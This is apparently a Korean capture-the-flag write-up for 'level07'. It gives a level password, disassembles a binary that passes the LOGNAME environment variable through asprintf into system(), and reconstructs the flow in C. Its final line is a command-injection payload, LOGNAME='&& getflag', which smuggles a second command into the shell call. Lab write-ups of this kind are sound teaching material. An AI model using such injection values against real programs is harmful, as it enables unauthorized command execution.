> Password: wiok45aaoguiboiki2tuin6ub

# 접근 방법

홈 디렉토리의 `level07`을 `objdump`를 이용하여 어셈블리 코드로 나타내면

```asm
[...]
804856f:	c7 04 24 80 86 04 08 	movl   $0x8048680,(%esp)
8048576:	e8 85 fe ff ff       	call   8048400 <getenv@plt>
804857b:	89 44 24 08          	mov    %eax,0x8(%esp)
804857f:	c7 44 24 04 88 86 04 	movl   $0x8048688,0x4(%esp)
8048586:	08
8048587:	8d 44 24 14          	lea    0x14(%esp),%eax
804858b:	89 04 24             	mov    %eax,(%esp)
804858e:	e8 ad fe ff ff       	call   8048440 <asprintf@plt>
8048593:	8b 44 24 14          	mov    0x14(%esp),%eax
8048597:	89 04 24             	mov    %eax,(%esp)
804859a:	e8 71 fe ff ff       	call   8048410 <system@plt>
804859f:	c9                   	leave
80485a0:	c3                   	ret
[...]
```

`$0x8048680` 주소의 문자열을 `getenv`함수의 첫 인자로 넣고 실행시켜서 환경 변수를 가져온 뒤에 그 값을 문자열 포매팅 함수인 `asprintf`를 이용해서 새로운 문자열에 넣은 뒤, 그 문자열 `system`함수를 사용해서 `shell`을 통해 실행하는 코드인 것을 확인할 수 있다.

전체적인 흐름을 `C`로 표현하면 다음과 같다.
```c
const char *s = getenv("LOGNAME");
asprintf(buf, "/env/echo %s", s);
system(buf);
```

따라서 환경 변수 `LOGNAME`를 `&& getflag` 과 같이 변경하면 `getflag` 프로그램이 실행되며 `token`을 획득할 수 있다.

```bash
$ LOGNAME='&& getflag' ./level07
```
